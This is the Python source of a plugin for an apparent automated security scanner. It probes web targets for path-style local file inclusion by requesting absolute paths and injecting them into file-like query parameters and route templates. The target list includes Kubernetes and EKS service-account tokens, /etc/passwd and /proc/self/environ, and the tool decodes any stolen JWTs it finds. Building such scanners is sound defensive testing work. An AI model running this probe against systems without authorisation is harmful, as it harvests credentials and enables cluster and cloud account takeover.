"""
HTTP-only path-style LFI exposure probe.

This tool is intentionally separate from param:probe and param:exploit_probe:
those tools mutate query/form parameters, while this one validates direct
absolute-path reads such as https://target//var/run/secrets/... .
"""

import base64
import hashlib
import json
import os
import re
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import (
    dedupe_keep_order,
    normalize_url,
    parse_headers,
    read_limited,
    same_origin,
)


DEFAULT_PATHS = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
    "/etc/hostname",
    "/etc/hosts",
    "/etc/resolv.conf",
    "/etc/passwd",
    "/etc/group",
    "/etc/os-release",
    "/etc/issue",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/self/environ",
    "/proc/1/environ",
    "/proc/1/cmdline",
    "/proc/self/cmdline",
]

NEGATIVE_CONTROL_PATH = "/this/path/should/not/exist/xasm-lfi-negative-control"
JWT_RE = re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$")
HOSTNAME_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9_.-]{0,252}[A-Za-z0-9])?$")
HOSTS_LINE_RE = re.compile(r"(?m)^\s*(?:\d{1,3}\.){3}\d{1,3}\s+\S+")
RESOLV_LINE_RE = re.compile(r"(?m)^\s*(?:nameserver|search|options)\s+\S+")
LFI_PARAM_NAMES = {
    "file",
    "filepath",
    "file_path",
    "filename",
    "path",
    "full_path",
    "content",
    "page",
    "template",
    "include",
    "view",
    "doc",
    "document",
    "download",
    "url",
    "uri",
    "redirect",
    "next",
    "return",
}
LFI_TEMPLATE_RE = re.compile(
    r"\{(?:full_?path|file_?path|filepath|filename|file|path)(?::[^}]+)?\}"
    r"|<path:[^>]+>"
    r"|:[A-Za-z_]*(?:path|file|filename)[A-Za-z_]*"
    r"|\*"
)


class LfiFileExposureProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "lfi:file_exposure_probe"

    @property
    def description(self) -> str:
        return (
            "Runs bounded GET-only checks for path-style LFI file disclosure, "
            "including Kubernetes/EKS service-account token exposure."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "enabled": {"type": "boolean", "default": True},
                "paths": {"type": "array", "items": {"type": "string"}},
                "urls": {"type": "array", "items": {"type": "string"}},
                "discoveredUrls": {"type": "array", "items": {"type": "string"}},
                "apiEndpoints": {"type": "array"},
                "surfaceGraph": {"type": "object"},
                "pathJoinMode": {"type": "string", "default": "double-slash"},
                "maxPaths": {"type": "integer", "default": 80},
                "maxRequests": {"type": "integer", "default": 120},
                "maxBytes": {"type": "integer", "default": 250000},
                "timeoutSeconds": {"type": "integer", "default": 20},
                "includeNegativeControl": {"type": "boolean", "default": True},
                "negativeControlPath": {"type": "string", "default": NEGATIVE_CONTROL_PATH},
                "keepRawEvidence": {"type": "boolean", "default": True},
                "includeRawBodies": {"type": "boolean", "default": False},
                "includeHttpTranscript": {"type": "boolean", "default": True},
                "responseExcerptBytes": {"type": "integer", "default": 4096},
                "decodeJwt": {"type": "boolean", "default": True},
                "artifactRoot": {"type": "string", "default": "/tmp/xasm-lfi-evidence"},
                "headers": {"type": "object"},
                "authHeaders": {"type": "object"},
                "cookie": {"type": "string"},
                "authCookies": {"type": "string"},
            },
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
        }

    @property
    def metadata(self):
        return {
            "category": "agentic-recon",
            "phase": 3,
            "domain": ["web"],
            "input_type": ["url"],
            "output_type": ["findings", "lfi_file_exposure_results"],
            "chainable_after": ["browser:", "katana:", "param:", "surface:", "nuclei:", "decision:"],
            "chainable_before": ["nuclei:", "decision:"],
        }

    async def execute(self, parameters: Dict[str, Any]) -> Any:
        if parameters.get("enabled") is False:
            return {
                "success": True,
                "skipped": True,
                "tool": self.name,
                "reason": "disabled_by_policy",
                "findings": [],
                "summary": {"pathsChecked": 0, "confirmedReads": 0, "findings": 0},
            }
        target = normalize_url(parameters.get("target") or parameters.get("url") or "")
        if not target:
            return {"success": False, "error": "target or url is required"}
        parsed_target = urlparse(target)
        if parsed_target.scheme not in {"http", "https"} or not parsed_target.netloc:
            return {"success": False, "error": f"target must be an http(s) URL: {target}"}

        max_paths = max(1, min(int(parameters.get("maxPaths") or 80), 200))
        max_requests = max(1, min(int(parameters.get("maxRequests") or 120), 300))
        max_bytes = max(1024, min(int(parameters.get("maxBytes") or 250_000), 2_000_000))
        timeout_seconds = max(3, min(int(parameters.get("timeoutSeconds") or 20), 120))
        decode_jwt = bool(parameters.get("decodeJwt", True))
        include_raw_bodies = bool(parameters.get("includeRawBodies", False))
        include_http_transcript = bool(parameters.get("includeHttpTranscript", True))
        response_excerpt_bytes = max(0, min(int(parameters.get("responseExcerptBytes") or 4096), 16384))
        keep_raw_evidence = bool(parameters.get("keepRawEvidence", True))

        paths = parameters.get("paths") if isinstance(parameters.get("paths"), list) else DEFAULT_PATHS
        paths = [self._normalize_path(str(path)) for path in paths if str(path or "").strip()]
        paths = dedupe_keep_order(paths, max_paths)

        negative_path = self._normalize_path(str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH))
        include_negative_control = bool(parameters.get("includeNegativeControl", True))
        probe_paths = list(paths)
        if include_negative_control:
            probe_paths = [negative_path, *[path for path in probe_paths if path != negative_path]]
        probe_specs = self._build_probe_specs(
            target,
            probe_paths,
            parameters,
            max_requests=max_requests,
            join_mode=str(parameters.get("pathJoinMode") or "double-slash"),
        )

        evidence_dir = None
        if keep_raw_evidence:
            evidence_dir = self._prepare_evidence_dir(parameters, target)

        headers = {
            "User-Agent": "xASM-lfi-file-exposure-probe/1.0",
            "Accept": "*/*",
            **parse_headers(parameters),
        }
        connector = aiohttp.TCPConnector(ssl=False)
        negative_hashes = set()
        results: List[Dict[str, Any]] = []
        findings: List[Dict[str, Any]] = []
        agent = parameters.get("_agent")

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=timeout_seconds),
        ) as session:
            for index, spec in enumerate(probe_specs, 1):
                path = spec["path"]
                url = spec["url"]
                if agent:
                    agent.report_progress("Probing path-style LFI files", url, index - 1, len(probe_specs))
                if not same_origin(target, url):
                    results.append(
                        {
                            "path": path,
                            "url": url,
                            "success": False,
                            "classification": "out_of_scope",
                            "error": "constructed URL is outside target origin",
                            "source": spec.get("source"),
                        }
                    )
                    continue

                fetched = await self._fetch(
                    session,
                    url,
                    path,
                    headers,
                    max_bytes,
                    evidence_dir,
                    include_http_transcript,
                    response_excerpt_bytes,
                )
                if path == negative_path and fetched["sha256"]:
                    negative_hashes.add(fetched["sha256"])
                classification = self._classify_body(
                    path=path,
                    status=fetched["status"],
                    body=fetched["bodyText"],
                    sha256=fetched["sha256"],
                    negative_hashes=negative_hashes,
                    decode_jwt=decode_jwt,
                    is_negative_control=include_negative_control and path == negative_path,
                )
                evidence = {
                    **{k: v for k, v in fetched.items() if k != "bodyText"},
                    **classification,
                    "source": spec.get("source"),
                }
                if include_raw_bodies:
                    evidence["rawBody"] = fetched["bodyText"]
                results.append(evidence)
                finding = self._finding_for_evidence(evidence)
                if finding:
                    findings.append(finding)

        findings = self._dedupe_findings(findings)
        raw_output = "\n".join(self._finding_line(f) for f in findings)
        return {
            "success": True,
            "target": target,
            "tool": self.name,
            "evidenceDir": str(evidence_dir) if evidence_dir else None,
            "results": results,
            "findings": findings,
            "total_findings": len(findings),
            "findings_delivered": len(findings),
            "rawOutput": raw_output,
            "summary": {
                "pathsChecked": len(results),
                "surfaceCandidates": len([r for r in results if r.get("source") != "direct-path"]),
                "confirmedReads": len([r for r in results if r.get("confirmedRead")]),
                "tokenExposures": len([r for r in results if r.get("tokenExposure")]),
                "findings": len(findings),
            },
        }

    async def _fetch(
        self,
        session: aiohttp.ClientSession,
        url: str,
        path: str,
        headers: Dict[str, str],
        max_bytes: int,
        evidence_dir: Optional[Path],
        include_http_transcript: bool,
        response_excerpt_bytes: int,
    ) -> Dict[str, Any]:
        try:
            async with session.get(url, headers=headers, allow_redirects=False) as response:
                body = await read_limited(response.content, max_bytes + 1)
                truncated = len(body) > max_bytes
                if truncated:
                    body = body[:max_bytes]
                body_text = body.decode("utf-8", errors="replace")
                sha256 = hashlib.sha256(body).hexdigest()
                artifact = self._write_artifacts(evidence_dir, path, response.headers, body) if evidence_dir else {}
                result = {
                    "path": path,
                    "url": url,
                    "status": response.status,
                    "headers": {
                        "content-type": response.headers.get("content-type"),
                        "content-length": response.headers.get("content-length"),
                    },
                    "bytes": len(body),
                    "sha256": sha256,
                    "truncated": truncated,
                    "bodyText": body_text,
                    **artifact,
                }
                if include_http_transcript:
                    result.update(
                        {
                            "requestTranscript": self._request_transcript(url, headers),
                            "responseTranscript": self._response_transcript(
                                response.status,
                                response.reason,
                                response.headers,
                                body,
                                truncated,
                                response_excerpt_bytes,
                            ),
                            "curlCommand": self._curl_command(url, headers),
                        }
                    )
                return result
        except Exception as exc:
            return {
                "path": path,
                "url": url,
                "status": None,
                "headers": {},
                "bytes": 0,
                "sha256": None,
                "truncated": False,
                "bodyText": "",
                "classification": "fetch_error",
                "error": str(exc)[:300],
            }

    def _classify_body(
        self,
        *,
        path: str,
        status: Optional[int],
        body: str,
        sha256: Optional[str],
        negative_hashes: set,
        decode_jwt: bool,
        is_negative_control: bool = False,
    ) -> Dict[str, Any]:
        if status is None:
            return {"classification": "fetch_error", "confirmedRead": False}
        if is_negative_control:
            return {"classification": "negative_control", "confirmedRead": False}
        stripped = (body or "").strip()
        if status >= 400:
            return {"classification": "not_readable", "confirmedRead": False}
        if sha256 and sha256 in negative_hashes and path != NEGATIVE_CONTROL_PATH:
            return {"classification": "fallback_body", "confirmedRead": False}

        decoded = self._decode_jwt(stripped) if decode_jwt and JWT_RE.match(stripped or "") else None
        if decoded:
            token_type = self._classify_jwt(path, decoded)
            return {
                "classification": token_type,
                "confirmedRead": True,
                "tokenExposure": True,
                "jwt": decoded,
            }
        lowered = stripped.lower()
        if self._looks_like_html_or_error_page(stripped):
            return {"classification": "html_or_error_page", "confirmedRead": False}
        if "-----begin certificate-----" in lowered:
            return {"classification": "kubernetes_ca_certificate", "confirmedRead": True}
        if path.endswith("/namespace") and stripped and re.match(r"^[a-z0-9][a-z0-9-]{0,62}$", stripped):
            return {"classification": "kubernetes_namespace", "confirmedRead": True, "namespace": stripped}
        if "root:x:0:0:" in lowered:
            return {"classification": "unix_passwd", "confirmedRead": True}
        if "root:x:0:" in lowered and "daemon:x:" in lowered:
            return {"classification": "unix_group", "confirmedRead": True}
        if "pretty_name=" in lowered or "id_like=" in lowered:
            return {"classification": "os_release", "confirmedRead": True}
        if path.endswith("/hostname") and self._looks_like_hostname_file(stripped):
            return {"classification": "container_hostname", "confirmedRead": True}
        if path.endswith("/hosts") and HOSTS_LINE_RE.search(stripped):
            return {"classification": "container_network_config", "confirmedRead": True}
        if path.endswith("/resolv.conf") and RESOLV_LINE_RE.search(stripped):
            return {"classification": "container_network_config", "confirmedRead": True}
        if status < 400 and body == "":
            return {"classification": "empty_pseudo_file_or_suppressed_read", "confirmedRead": False}
        if status < 400 and stripped:
            return {"classification": "unclassified_non_empty_response", "confirmedRead": False}
        return {"classification": "unknown", "confirmedRead": False}

    def _looks_like_html_or_error_page(self, body: str) -> bool:
        sample = str(body or "").strip().lower()[:4096]
        if not sample:
            return False
        if sample.startswith("<!doctype html") or sample.startswith("<html") or "<html" in sample:
            return True
        return any(
            marker in sample
            for marker in (
                "page not found",
                "not found",
                "404",
                "forbidden",
                "access denied",
                "oops",
            )
        ) and any(tag in sample for tag in ("<body", "<head", "<title", "<div", "<script"))

    def _looks_like_hostname_file(self, body: str) -> bool:
        stripped = str(body or "").strip()
        if not stripped or "\n" in stripped or "\r" in stripped or "/" in stripped or "<" in stripped:
            return False
        return bool(HOSTNAME_RE.match(stripped))

    def _classify_jwt(self, path: str, decoded: Dict[str, Any]) -> str:
        claims = decoded.get("claims") or {}
        aud = claims.get("aud")
        audiences = aud if isinstance(aud, list) else [aud]
        if "sts.amazonaws.com" in audiences or "eks.amazonaws.com" in path:
            return "eks_irsa_web_identity_token"
        if str(claims.get("sub") or "").startswith("system:serviceaccount:"):
            return "kubernetes_serviceaccount_token"
        return "jwt_token"

    def _decode_jwt(self, token: str) -> Optional[Dict[str, Any]]:
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return None
            header = json.loads(self._b64url_decode(parts[0]))
            claims = json.loads(self._b64url_decode(parts[1]))
            if "exp" in claims:
                claims["exp_utc"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(int(claims["exp"])))
                claims["seconds_until_exp"] = int(claims["exp"]) - int(time.time())
            sub = str(claims.get("sub") or "")
            if sub.startswith("system:serviceaccount:"):
                _, _, namespace, service_account = sub.split(":", 3)
                claims["serviceAccountRef"] = {
                    "namespace": namespace,
                    "serviceAccount": service_account,
                }
            return {"header": header, "claims": claims}
        except Exception:
            return None

    def _b64url_decode(self, value: str) -> str:
        padded = value + "=" * (-len(value) % 4)
        return base64.urlsafe_b64decode(padded.encode()).decode("utf-8", errors="replace")

    def _finding_for_evidence(self, evidence: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        classification = evidence.get("classification")
        if not evidence.get("confirmedRead") and classification != "empty_pseudo_file_or_suppressed_read":
            return None
        path = str(evidence.get("path") or "")
        url = str(evidence.get("url") or "")
        extracted = [path, f"sha256:{evidence.get('sha256')}", f"bytes:{evidence.get('bytes')}"]
        request = evidence.get("requestTranscript")
        response = evidence.get("responseTranscript")
        curl_command = evidence.get("curlCommand")

        if classification == "kubernetes_serviceaccount_token":
            claims = (evidence.get("jwt") or {}).get("claims") or {}
            return self._finding(
                template_id="xasm-kubernetes-serviceaccount-token-exposed",
                name="Kubernetes Service Account Token Exposed via LFI",
                severity="critical",
                matched_at=url,
                description=(
                    "Path-style LFI exposed a Kubernetes projected service-account token. "
                    "The token can authenticate as the pod's service account until expiry, "
                    "subject to cluster RBAC and API reachability."
                ),
                remediation="Block absolute-path file reads, rotate the pod, and review service-account RBAC.",
                matcher_name="kubernetes-serviceaccount-jwt",
                extracted=[*extracted, str(claims.get("sub")), str(claims.get("aud"))],
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification == "eks_irsa_web_identity_token":
            claims = (evidence.get("jwt") or {}).get("claims") or {}
            return self._finding(
                template_id="xasm-eks-irsa-token-exposed",
                name="EKS IRSA Web Identity Token Exposed via LFI",
                severity="critical",
                matched_at=url,
                description=(
                    "Path-style LFI exposed an EKS web-identity token with sts.amazonaws.com audience. "
                    "If the service account is trusted by an IAM role, this may allow AWS role assumption."
                ),
                remediation="Block absolute-path file reads, rotate the pod, and review IRSA trust/policies.",
                matcher_name="eks-irsa-jwt",
                extracted=[*extracted, str(claims.get("sub")), str(claims.get("aud"))],
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification in {"kubernetes_namespace", "kubernetes_ca_certificate"}:
            return self._finding(
                template_id="xasm-kubernetes-serviceaccount-file-exposed",
                name="Kubernetes Service Account File Exposed via LFI",
                severity="high",
                matched_at=url,
                description="Path-style LFI exposed Kubernetes service-account metadata or trust material.",
                remediation="Prevent reads outside an allowlisted file root and disable unnecessary token automounts.",
                matcher_name=str(classification),
                extracted=extracted,
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification in {"unix_passwd", "unix_group", "os_release", "container_hostname", "container_network_config"}:
            return self._finding(
                template_id="xasm-container-context-file-exposed",
                name="Container Context File Exposed via LFI",
                severity="high" if classification == "unix_passwd" else "medium",
                matched_at=url,
                description="Path-style LFI exposed container operating-system or network context.",
                remediation="Normalize requested paths and enforce a strict server-side file allowlist.",
                matcher_name=str(classification),
                extracted=extracted,
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification == "file_read":
            return self._finding(
                template_id="xasm-lfi-path-style-file-read",
                name="Path-Style Local File Inclusion",
                severity="high",
                matched_at=url,
                description="The target returned non-fallback content for an absolute filesystem path.",
                remediation="Reject absolute paths and traversal, and serve only mapped file identifiers.",
                matcher_name="absolute-path-read",
                extracted=extracted,
                request=request,
                response=response,
                curl_command=curl_command,
            )
        return None

    def _finding(
        self,
        *,
        template_id: str,
        name: str,
        severity: str,
        matched_at: str,
        description: str,
        remediation: str,
        matcher_name: str,
        extracted: List[str],
        request: Optional[str] = None,
        response: Optional[str] = None,
        curl_command: Optional[str] = None,
    ) -> Dict[str, Any]:
        finding = {
            "template-id": template_id,
            "templateID": template_id,
            "matched-at": matched_at,
            "matched": matched_at,
            "host": matched_at,
            "matcher-name": matcher_name,
            "extracted-results": [item for item in extracted if item and item != "None"],
            "info": {
                "name": name,
                "severity": severity,
                "description": description,
                "remediation": remediation,
            },
        }
        if request:
            finding["request"] = request
        if response:
            finding["response"] = response
        if curl_command:
            finding["curl-command"] = curl_command
        return finding

    def _dedupe_findings(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        deduped: Dict[str, Dict[str, Any]] = {}
        for finding in findings:
            raw_key = f"{finding.get('template-id')}|{finding.get('matched-at')}"
            deduped.setdefault(hashlib.sha256(raw_key.encode()).hexdigest(), finding)
        return list(deduped.values())

    def _finding_line(self, finding: Dict[str, Any]) -> str:
        info = finding.get("info") or {}
        return f"[{str(info.get('severity', 'info')).upper()}] {info.get('name')} - {finding.get('matched-at')}"

    def _build_lfi_url(self, target: str, path: str, mode: str = "double-slash") -> str:
        parsed = urlparse(target)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        normalized_path = self._normalize_path(path)
        if mode == "single-slash":
            return f"{origin}{normalized_path}"
        if mode == "relative":
            base_path = parsed.path.rstrip("/") or ""
            return f"{origin}{base_path}{normalized_path}"
        return f"{origin}/{normalized_path}"

    def _build_probe_specs(
        self,
        target: str,
        probe_paths: List[str],
        parameters: Dict[str, Any],
        *,
        max_requests: int,
        join_mode: str,
    ) -> List[Dict[str, str]]:
        specs: List[Dict[str, str]] = []
        seen = set()

        def add(path: str, url: str, source: str) -> None:
            key = (path, url)
            if key in seen:
                return
            seen.add(key)
            specs.append({"path": path, "url": url, "source": source})

        for path in probe_paths:
            add(path, self._build_lfi_url(target, path, join_mode), "direct-path")

        for url in self._surface_lfi_candidate_urls(target, probe_paths, parameters):
            parsed = urlparse(url)
            path_hint = self._path_hint_from_url(parsed)
            add(path_hint, url, "surface-derived")
            if len(specs) >= max_requests:
                break
        return specs[:max_requests]

    def _surface_lfi_candidate_urls(
        self,
        target: str,
        probe_paths: List[str],
        parameters: Dict[str, Any],
    ) -> List[str]:
        candidates: List[str] = []
        surface_urls = self._extract_surface_urls(target, parameters)
        lfi_paths = [p for p in probe_paths if p != self._normalize_path(str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH))]
        for source_url in surface_urls:
            parsed = urlparse(source_url)
            if parsed.query:
                for path in lfi_paths:
                    rendered = self._replace_lfi_query_params(source_url, path)
                    if rendered:
                        candidates.append(rendered)
            if self._looks_like_lfi_path_template(parsed.path):
                for path in lfi_paths:
                    rendered = self._render_path_template(target, parsed.path, path)
                    if rendered:
                        candidates.append(rendered)
        for endpoint in self._extract_api_endpoints(target, parameters):
            path_value = endpoint.get("path") or endpoint.get("url") or ""
            parsed = urlparse(str(path_value))
            endpoint_path = parsed.path if parsed.scheme else str(path_value)
            if not self._looks_like_lfi_path_template(endpoint_path):
                continue
            for path in lfi_paths:
                rendered = self._render_path_template(target, endpoint_path, path)
                if rendered:
                    candidates.append(rendered)
        return dedupe_keep_order([url for url in candidates if same_origin(target, url)], 240)

    def _extract_surface_urls(self, target: str, parameters: Dict[str, Any]) -> List[str]:
        values: List[Any] = []
        for key in ("urls", "discoveredUrls", "links", "targets", "parameterizedUrls", "siteMapUrls"):
            raw = parameters.get(key)
            if isinstance(raw, list):
                values.extend(raw)
        graph = parameters.get("surfaceGraph")
        if isinstance(graph, dict):
            for key in ("urls", "parameterizedUrls", "links", "siteMapUrls"):
                raw = graph.get(key)
                if isinstance(raw, list):
                    values.extend(raw)
        urls: List[str] = []
        for value in values:
            url = self._coerce_url(target, value)
            if url:
                urls.append(url)
        return dedupe_keep_order(urls, 240)

    def _extract_api_endpoints(self, target: str, parameters: Dict[str, Any]) -> List[Dict[str, str]]:
        values: List[Any] = []
        raw = parameters.get("apiEndpoints")
        if isinstance(raw, list):
            values.extend(raw)
        graph = parameters.get("surfaceGraph")
        if isinstance(graph, dict) and isinstance(graph.get("apiEndpoints"), list):
            values.extend(graph.get("apiEndpoints"))
        out: List[Dict[str, str]] = []
        for item in values:
            if isinstance(item, str):
                url = self._coerce_url(target, item)
                out.append({"url": url or item, "path": urlparse(url).path if url else item})
            elif isinstance(item, dict):
                url = self._coerce_url(target, item.get("url") or item.get("href") or item.get("path"))
                path = str(item.get("path") or item.get("originalPath") or item.get("route") or "")
                out.append({"url": url or "", "path": path or (urlparse(url).path if url else "")})
        return out

    def _coerce_url(self, target: str, value: Any) -> Optional[str]:
        raw = value
        if isinstance(value, dict):
            raw = value.get("url") or value.get("href") or value.get("path")
        text = str(raw or "").strip()
        if not text:
            return None
        try:
            if text.startswith("/"):
                return urljoin(target, text)
            if text.startswith("http://") or text.startswith("https://"):
                return normalize_url(text)
        except Exception:
            return None
        return None

    def _replace_lfi_query_params(self, url: str, path: str) -> Optional[str]:
        parsed = urlparse(url)
        query = parse_qsl(parsed.query, keep_blank_values=True)
        if not query:
            return None
        replaced = False
        next_query = []
        for name, value in query:
            if name.lower() in LFI_PARAM_NAMES:
                next_query.append((name, path))
                replaced = True
            else:
                next_query.append((name, value))
        if not replaced:
            return None
        return urlunparse(parsed._replace(query=urlencode(next_query, doseq=True)))

    def _looks_like_lfi_path_template(self, path: str) -> bool:
        return bool(LFI_TEMPLATE_RE.search(str(path or "")))

    def _render_path_template(self, target: str, template_path: str, file_path: str) -> Optional[str]:
        if not template_path:
            return None
        replacement = self._normalize_path(file_path).lstrip("/")
        rendered = LFI_TEMPLATE_RE.sub(replacement, template_path)
        if not rendered.startswith("/"):
            rendered = f"/{rendered}"
        parsed = urlparse(target)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        try:
            return normalize_url(f"{origin}{rendered}")
        except Exception:
            return None

    def _path_hint_from_url(self, parsed) -> str:
        query = parse_qsl(parsed.query, keep_blank_values=True)
        for name, value in query:
            if name.lower() in LFI_PARAM_NAMES and value:
                return self._normalize_path(value)
        return parsed.path or "/"

    def _normalize_path(self, path: str) -> str:
        path = str(path or "").strip()
        if not path.startswith("/"):
            path = f"/{path}"
        return path

    def _request_transcript(self, url: str, headers: Dict[str, str]) -> str:
        parsed = urlparse(url)
        request_target = parsed.path or "/"
        if parsed.query:
            request_target = f"{request_target}?{parsed.query}"
        lines = [f"GET {request_target} HTTP/1.1", f"Host: {parsed.netloc}"]
        for name, value in sorted(headers.items()):
            if name.lower() == "host":
                continue
            lines.append(f"{name}: {self._redact_header(name, str(value))}")
        return "\r\n".join(lines) + "\r\n\r\n"

    def _response_transcript(
        self,
        status: int,
        reason: Optional[str],
        headers: aiohttp.typedefs.LooseHeaders,
        body: bytes,
        truncated: bool,
        excerpt_bytes: int,
    ) -> str:
        lines = [f"HTTP/1.1 {status} {reason or ''}".rstrip()]
        for name, value in sorted(dict(headers).items()):
            lines.append(f"{name}: {self._redact_header(name, str(value))}")
        lines.append("")
        if excerpt_bytes > 0:
            excerpt = body[:excerpt_bytes].decode("utf-8", errors="replace")
            lines.append(excerpt)
            if truncated or len(body) > excerpt_bytes:
                lines.append(f"\n[truncated: showing first {excerpt_bytes} bytes]")
        return "\r\n".join(lines)

    def _curl_command(self, url: str, headers: Dict[str, str]) -> str:
        parts = ["curl", "--path-as-is", "-i", "-sS"]
        for name, value in sorted(headers.items()):
            rendered_value = self._redact_header(name, str(value))
            parts.extend(["-H", self._shell_quote(f"{name}: {rendered_value}")])
        parts.append(self._shell_quote(url))
        return " ".join(parts)

    def _redact_header(self, name: str, value: str) -> str:
        if name.lower() in {"authorization", "cookie", "x-api-key", "proxy-authorization"}:
            return "[REDACTED]"
        return value

    def _shell_quote(self, value: str) -> str:
        return "'" + value.replace("'", "'\"'\"'") + "'"

    def _prepare_evidence_dir(self, parameters: Dict[str, Any], target: str) -> Path:
        root = Path(str(parameters.get("artifactRoot") or "/tmp/xasm-lfi-evidence"))
        host = re.sub(r"[^A-Za-z0-9_.-]+", "_", urlparse(target).netloc or "target")
        execution_id = str(parameters.get("executionId") or int(time.time()))
        evidence_dir = root / f"{host}-{execution_id}"
        evidence_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        try:
            os.chmod(evidence_dir, 0o700)
        except OSError:
            pass
        return evidence_dir

    def _write_artifacts(
        self,
        evidence_dir: Optional[Path],
        path: str,
        headers: aiohttp.typedefs.LooseHeaders,
        body: bytes,
    ) -> Dict[str, str]:
        if not evidence_dir:
            return {}
        safe_name = re.sub(r"[^A-Za-z0-9_.-]+", "__", path.strip("/")) or "root"
        body_path = evidence_dir / f"{safe_name}.body"
        headers_path = evidence_dir / f"{safe_name}.headers.json"
        body_path.write_bytes(body)
        headers_path.write_text(json.dumps(dict(headers), indent=2, sort_keys=True))
        try:
            os.chmod(body_path, 0o600)
            os.chmod(headers_path, 0o600)
        except OSError:
            pass
        return {"rawEvidencePath": str(body_path), "headersPath": str(headers_path)}


def get_tool():
    return LfiFileExposureProbeTool()
